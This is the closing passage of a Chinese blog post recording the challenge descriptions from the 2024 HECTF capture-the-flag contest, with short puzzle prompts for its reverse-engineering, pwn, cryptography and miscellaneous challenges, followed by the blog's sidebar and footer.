<h3 id="pepy-2"><a class="markdownIt-Anchor" href="#pepy-2">#</a> <strong>PE?py?</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>在 pyre 里找到压缩包密码</p>
</blockquote>
<h3 id="easyree-2"><a class="markdownIt-Anchor" href="#easyree-2">#</a> <strong>easyree</strong></h3>
<p>题目描述：</p>
<blockquote xxxx="">
<p>flag 格式 HECTF</p>
</blockquote>
<h3 id="ezandroid-2"><a class="markdownIt-Anchor" href="#ezandroid-2">#</a> <strong>ezAndroid</strong></h3>
<p>题目描述：</p>
<blockquote></blockquote>
<h2 id="pwn-3"><a class="markdownIt-Anchor" href="#pwn-3">#</a> Pwn</h2>
<h3 id="sign-in-3"><a class="markdownIt-Anchor" href="#sign-in-3">#</a> <strong>sign in</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>快来签到吧…</p>
</blockquote>
<h3 id="find-eggy-3"><a class="markdownIt-Anchor" href="#find-eggy-3">#</a> <strong>find eggy</strong></h3>
<p>题目描述：</p>
<blockquote></blockquote>
<h3 id="arcaea_sorting-3"><a class="markdownIt-Anchor" href="#arcaea_sorting-3">#</a> <strong>Arcaea_Sorting</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>–为何我的眼里常含泪水，因为我爱这 libc，爱得深沉  (<em><sup>▽</sup></em>)</p>
<p>听好了：</p>
<p>XX 月 XX 日，g01den 自制的查分系统正式完工，每个部署了该系统的服务器都将会迎来一场漩涡，为这些服务器带来全新的危机。</p>
<p>你所购买的服务器都将迎来黑客的试炼，你所熟悉的服务器都将加诸栈溢出的历练。</p>
<p>至此，一锤定音。</p>
<p>尘埃，已然落定。</p>
<p>#HECTF #听好了 #韵律源点</p>
</blockquote>
<h3 id="arcaea_sorting_revenge-3"><a class="markdownIt-Anchor" href="#arcaea_sorting_revenge-3">#</a> <strong>Arcaea_Sorting_Revenge</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>g01den 得知他写的查分器存在漏洞，他害怕到大晚上睡不着，第二天一早火急火燎地把程序重写了，但是他突然发现他学艺不精，突然不会写链表数据结构了，于是，他将查分器改成了存储分数的存储器，希望这次不会出现安全性问题。</p>
</blockquote>
<h3 id="喵喵喵-2"><a class="markdownIt-Anchor" href="#喵喵喵-2">#</a> <strong>喵喵喵</strong></h3>
<p>题目描述：</p>
<blockquote></blockquote>
<h3 id="lip-2"><a class="markdownIt-Anchor" href="#lip-2">#</a> <strong>lip</strong></h3>
<p>题目描述：</p>
<blockquote></blockquote>
<h2 id="crypto-3"><a class="markdownIt-Anchor" href="#crypto-3">#</a> Crypto</h2>
<h3 id="迷茫的艾米莉-3"><a class="markdownIt-Anchor" href="#迷茫的艾米莉-3">#</a> <strong>迷茫的艾米莉</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>题目描述：迷茫的艾米莉 描述：在维吉尼亚小镇，园丁艾米莉的 responsibility 是照顾一座古老花园，每天修剪六段绿篱栅栏。一天，她 发现通往秘密花园的小径，入口却被封上了，上面有一串密文 Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr，请输入密码帮助艾米莉探索秘密花园</p>
</blockquote>
<h3 id="翻一翻-3"><a class="markdownIt-Anchor" href="#翻一翻-3">#</a> <strong>翻一翻</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>小明最近失恋了，翻来覆去睡不着，请帮他找出失恋的关键信息</p>
</blockquote>
<h3 id="seven-more-3"><a class="markdownIt-Anchor" href="#seven-more-3">#</a> <strong>seven more</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>more than more no co-prime</p>
</blockquote>
<h3 id="情书与破碎的证书-3"><a class="markdownIt-Anchor" href="#情书与破碎的证书-3">#</a> <strong>情书与破碎的证书</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>小明喜欢上了小红，他使用 rsa 向小红发送了无数封含有中文字符的情书。终于小红忍不住了，找到了大嘿阔将小明的私钥证书打成碎片，移除了中间的内容并把上下段的私钥部分转化成 16 进制，以九个为一组用相同的方式打乱（转化时产生的 0d0a 换行符已被移除）。作为密码学大佬的你能恢复证书，找出小红忍无可忍的证据么？</p>
<p><strong>提示 1</strong> 情书与破碎的证书 hint1: 字符中含有中文 常规输出方法无效，请使用 PKCS1_OAEP 解密器，并使用 cipher.decrypt () 解密密文（毕竟考点是证书）</p>
</blockquote>
<h3 id="不合格的魔药-3"><a class="markdownIt-Anchor" href="#不合格的魔药-3">#</a> <strong>不合格的魔药</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>刚开始学习魔药的小 A 总是只关注魔药的颜色而忽略配比，这次他配置的魔药又是这样，这样一份不合格的魔药完全没办法达到对信息 “保密” 的效果了，请从这份面目全非的成品中还原出小 A 想隐藏的信息</p>
</blockquote>
<h2 id="misc-3"><a class="markdownIt-Anchor" href="#misc-3">#</a> Misc</h2>
<h3 id="rem_you-2"><a class="markdownIt-Anchor" href="#rem_you-2">#</a> <strong>Rem_You</strong></h3>
<p>题目描述：</p>
<blockquote></blockquote>
<h3 id="funny-2"><a class="markdownIt-Anchor" href="#funny-2">#</a> <strong>funny</strong></h3>
<p>题目描述：</p>
<blockquote 省-市-广场名字-水边名字="">
<p>看了半天电脑的小明非常劳累，便摸鱼去楼下的广场逛一逛但觉得广场太吵闹了，又去了水边看大爷们钓鱼，你能找出小明去的广场和水边的名字嘛</p>
<p>flag 格式  HECTF {北京市 - 区 - 广场名字 - 水边名字}   HECTF</p>
</blockquote>
<h3 id="简单的压缩包-3"><a class="markdownIt-Anchor" href="#简单的压缩包-3">#</a> <strong>简单的压缩包</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>w41tm00n 是个 kisaki 推，某天在水群的时候，一个同为 kisaki 推的 g01den 在群里分享了个压缩包，并留言里面有一张 kisaki 的图，同时里面还存在着神秘的信息（这里是 flag），w41tm00n 对此很感兴趣，你可以帮他得到神秘的信息（flag）吗？</p>
</blockquote>
<h3 id="恶势力的仓库-2"><a class="markdownIt-Anchor" href="#恶势力的仓库-2">#</a> <strong>恶势力的仓库</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>恶势力的仓库惨遭毒手，就代表着毒手伸进了恶势力的仓库</p>
</blockquote>
<h3 id="恶势力的聊天记录-2"><a class="markdownIt-Anchor" href="#恶势力的聊天记录-2">#</a> <strong>恶势力的聊天记录</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>附件下载地址： 链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWJHRXFnclJncVo2MVU4VHhBRDdxTkE=">https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA</span>  提取码：o07y</p>
</blockquote>

      <div class="tags">
          <a href="/tags/Game/" rel="tag"><i class="ic i-tag"></i> Game</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2024-12-09 21:13:34" itemprop="dateModified" datetime="2024-12-09T21:13:34+08:00">2024-12-09</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
        <p>微信支付</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="g01den 支付宝">
        <p>支付宝</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="g01den 贝宝">
        <p>贝宝</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="http://blog.g01den.top/posts/de34fe7b.html" title="【2024】HECTF-个人整理向">http://blog.g01den.top/posts/de34fe7b.html</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/posts/ad175165.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;12&#x2F;09&#x2F;UxuP4fcVCgLi5IH.png" title="ctfshow-文件包含">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> Web狗的自我安慰</span>
  <h3>ctfshow-文件包含</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/posts/cf99ed43.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2025&#x2F;03&#x2F;26&#x2F;xrS4V3bGRAsozXj.jpg" title="从NSSCTF开始的复建之路">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> 发电日常</span>
  <h3>从NSSCTF开始的复建之路</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#wp"><span class="toc-number">1.</span> <span class="toc-text"> WP：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text"> Web：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#are-you-happy"><span class="toc-number">1.1.1.</span> <span class="toc-text"> Are you happy?：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby_unserialize"><span class="toc-number">1.1.2.</span> <span class="toc-text"> baby_unserialize：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby_sql"><span class="toc-number">1.1.3.</span> <span class="toc-text"> baby_sql：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">1.1.3.1.</span> <span class="toc-text"> 非预期：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">1.1.3.2.</span> <span class="toc-text"> 预期解</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 你一个人专属的进货网站：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezweb"><span class="toc-number">1.1.5.</span> <span class="toc-text"> ezweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjava"><span class="toc-number">1.1.6.</span> <span class="toc-text"> ezjava：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.2.</span> <span class="toc-text"> Misc：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 简单的压缩包：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">1.3.</span> <span class="toc-text"> Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sign-in"><span class="toc-number">1.3.1.</span> <span class="toc-text"> sign in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find-eggy"><span class="toc-number">1.3.2.</span> <span class="toc-text"> find eggy：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arcaea_sorting"><span class="toc-number">1.3.3.</span> <span class="toc-text"> Arcaea_Sorting：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arcaea_sorting_revenge"><span class="toc-number">1.3.4.</span> <span class="toc-text"> Arcaea_Sorting_Revenge：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re"><span class="toc-number">1.4.</span> <span class="toc-text"> Re：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyre"><span class="toc-number">1.4.1.</span> <span class="toc-text"> babyre：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">1.5.</span> <span class="toc-text"> Crypto：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 迷茫的艾米莉</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seven-more"><span class="toc-number">1.5.2.</span> <span class="toc-text"> seven more</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BF%BB%E4%B8%80%E7%BF%BB"><span class="toc-number">1.5.3.</span> <span class="toc-text"> 翻一翻：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF"><span class="toc-number">1.5.4.</span> <span class="toc-text"> 不合格的魔药：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6"><span class="toc-number">1.5.5.</span> <span class="toc-text"> 情书与破碎的证书</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%E8%AE%B0%E5%BD%95"><span class="toc-number">2.</span> <span class="toc-text"> 题目描述记录：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-2"><span class="toc-number">2.1.</span> <span class="toc-text"> Web：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#are-u-happy"><span class="toc-number">2.1.1.</span> <span class="toc-text"> Are u happy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby_sql-2"><span class="toc-number">2.1.2.</span> <span class="toc-text"> baby_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby_unserialize-2"><span class="toc-number">2.1.3.</span> <span class="toc-text"> baby_unserialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99-2"><span class="toc-number">2.1.4.</span> <span class="toc-text"> 你一个人专属的进货网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezweb-2"><span class="toc-number">2.1.5.</span> <span class="toc-text"> ezweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjava-2"><span class="toc-number">2.1.6.</span> <span class="toc-text"> ezjava</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re-2"><span class="toc-number">2.2.</span> <span class="toc-text"> Re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyre-2"><span class="toc-number">2.2.1.</span> <span class="toc-text"> babyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#littleasm"><span class="toc-number">2.2.2.</span> <span class="toc-text"> littleasm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pepy"><span class="toc-number">2.2.3.</span> <span class="toc-text"> PE?py?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyree"><span class="toc-number">2.2.4.</span> <span class="toc-text"> easyree</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezandroid"><span class="toc-number">2.2.5.</span> <span class="toc-text"> ezAndroid</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-2"><span class="toc-number">2.3.</span> <span class="toc-text"> Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sign-in-2"><span class="toc-number">2.3.1.</span> <span class="toc-text"> sign in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find-eggy-2"><span class="toc-number">2.3.2.</span> <span class="toc-text"> find eggy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arcaea_sorting-2"><span class="toc-number">2.3.3.</span> <span class="toc-text"> Arcaea_Sorting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arcaea_sorting_revenge-2"><span class="toc-number">2.3.4.</span> <span class="toc-text"> Arcaea_Sorting_Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%96%B5%E5%96%B5%E5%96%B5"><span class="toc-number">2.3.5.</span> <span class="toc-text"> 喵喵喵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lip"><span class="toc-number">2.3.6.</span> <span class="toc-text"> lip</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-2"><span class="toc-number">2.4.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89-2"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 迷茫的艾米莉</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BF%BB%E4%B8%80%E7%BF%BB-2"><span class="toc-number">2.4.2.</span> <span class="toc-text"> 翻一翻</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seven-more-2"><span class="toc-number">2.4.3.</span> <span class="toc-text"> seven more</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6-2"><span class="toc-number">2.4.4.</span> <span class="toc-text"> 情书与破碎的证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF-2"><span class="toc-number">2.4.5.</span> <span class="toc-text"> 不合格的魔药</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-2"><span class="toc-number">2.5.</span> <span class="toc-text"> Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rem_you"><span class="toc-number">2.5.1.</span> <span class="toc-text"> Rem_You</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#funny"><span class="toc-number">2.5.2.</span> <span class="toc-text"> funny</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-2"><span class="toc-number">2.5.3.</span> <span class="toc-text"> 简单的压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E4%BB%93%E5%BA%93"><span class="toc-number">2.5.4.</span> <span class="toc-text"> 恶势力的仓库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95"><span class="toc-number">2.5.5.</span> <span class="toc-text"> 恶势力的聊天记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby_unserialize-3"><span class="toc-number">2.5.6.</span> <span class="toc-text"> baby_unserialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E4%B8%80%E4%B8%AA%E4%BA%BA%E4%B8%93%E5%B1%9E%E7%9A%84%E8%BF%9B%E8%B4%A7%E7%BD%91%E7%AB%99-3"><span class="toc-number">2.5.7.</span> <span class="toc-text"> 你一个人专属的进货网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezweb-3"><span class="toc-number">2.5.8.</span> <span class="toc-text"> ezweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjava-3"><span class="toc-number">2.5.9.</span> <span class="toc-text"> ezjava</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re-3"><span class="toc-number">2.6.</span> <span class="toc-text"> Re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyre-3"><span class="toc-number">2.6.1.</span> <span class="toc-text"> babyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#littleasm-2"><span class="toc-number">2.6.2.</span> <span class="toc-text"> littleasm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pepy-2"><span class="toc-number">2.6.3.</span> <span class="toc-text"> PE?py?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyree-2"><span class="toc-number">2.6.4.</span> <span class="toc-text"> easyree</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezandroid-2"><span class="toc-number">2.6.5.</span> <span class="toc-text"> ezAndroid</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-3"><span class="toc-number">2.7.</span> <span class="toc-text"> Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sign-in-3"><span class="toc-number">2.7.1.</span> <span class="toc-text"> sign in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find-eggy-3"><span class="toc-number">2.7.2.</span> <span class="toc-text"> find eggy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arcaea_sorting-3"><span class="toc-number">2.7.3.</span> <span class="toc-text"> Arcaea_Sorting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arcaea_sorting_revenge-3"><span class="toc-number">2.7.4.</span> <span class="toc-text"> Arcaea_Sorting_Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%96%B5%E5%96%B5%E5%96%B5-2"><span class="toc-number">2.7.5.</span> <span class="toc-text"> 喵喵喵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lip-2"><span class="toc-number">2.7.6.</span> <span class="toc-text"> lip</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-3"><span class="toc-number">2.8.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%B7%E8%8C%AB%E7%9A%84%E8%89%BE%E7%B1%B3%E8%8E%89-3"><span class="toc-number">2.8.1.</span> <span class="toc-text"> 迷茫的艾米莉</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BF%BB%E4%B8%80%E7%BF%BB-3"><span class="toc-number">2.8.2.</span> <span class="toc-text"> 翻一翻</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seven-more-3"><span class="toc-number">2.8.3.</span> <span class="toc-text"> seven more</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E4%B9%A6%E4%B8%8E%E7%A0%B4%E7%A2%8E%E7%9A%84%E8%AF%81%E4%B9%A6-3"><span class="toc-number">2.8.4.</span> <span class="toc-text"> 情书与破碎的证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%88%E6%A0%BC%E7%9A%84%E9%AD%94%E8%8D%AF-3"><span class="toc-number">2.8.5.</span> <span class="toc-text"> 不合格的魔药</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-3"><span class="toc-number">2.9.</span> <span class="toc-text"> Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rem_you-2"><span class="toc-number">2.9.1.</span> <span class="toc-text"> Rem_You</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#funny-2"><span class="toc-number">2.9.2.</span> <span class="toc-text"> funny</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85-3"><span class="toc-number">2.9.3.</span> <span class="toc-text"> 简单的压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E4%BB%93%E5%BA%93-2"><span class="toc-number">2.9.4.</span> <span class="toc-text"> 恶势力的仓库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E5%8A%BF%E5%8A%9B%E7%9A%84%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95-2"><span class="toc-number">2.9.5.</span> <span class="toc-text"> 恶势力的聊天记录</span></a></li></ol></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li><a href="/posts/fe4eec6d.html" rel="bookmark" title="【2024】高校网络安全管理运维赛">【2024】高校网络安全管理运维赛</a></li><li><a href="/posts/955175a5.html" rel="bookmark" title="【2024】H&NCTF">【2024】H&NCTF</a></li><li><a href="/posts/9dd9bec.html" rel="bookmark" title="Ciscn2024">Ciscn2024</a></li><li><a href="/posts/a929fb97.html" rel="bookmark" title="【2023】LitCTF">【2023】LitCTF</a></li><li><a href="/posts/4bf5e0ee.html" rel="bookmark" title="【2024】LitCTF">【2024】LitCTF</a></li><li><a href="/posts/c2860616.html" rel="bookmark" title="网鼎杯2024青龙组官方资格赛wp">网鼎杯2024青龙组官方资格赛wp</a></li><li><a href="/posts/666fe8df.html" rel="bookmark" title="【2024】强网杯">【2024】强网杯</a></li><li class="active"><a href="/posts/de34fe7b.html" rel="bookmark" title="【2024】HECTF-个人整理向">【2024】HECTF-个人整理向</a></li><li><a href="/posts/a4378bd0.html" rel="bookmark" title="【2025】LitCTF">【2025】LitCTF</a></li><li><a href="/posts/215f7d8b.html" rel="bookmark" title="【2025】HECTF">【2025】HECTF</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="g01den"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">g01den</p>
  <div class="description" itemprop="description">golden的部落阁</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">50</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">10</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">8</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>
    
  <li class="item">
    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/posts/ad175165.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/posts/cf99ed43.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/2d792864.html" title="Python栈帧逃逸">Python栈帧逃逸</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
</div>

    <span><a href="/posts/3d5d6561.html" title="三、Servlet基础">三、Servlet基础</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Major/" title="分类于 考研专业课">考研专业课</a>
<i class="ic i-angle-right"></i>
<a href="/categories/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a>
</div>

    <span><a href="/posts/95e7063c.html" title="数据结构笔记-2、线性表">数据结构笔记-2、线性表</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
</div>

    <span><a href="/posts/52965aaa.html" title="pwn学习笔记（4）ret2libc">pwn学习笔记（4）ret2libc</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

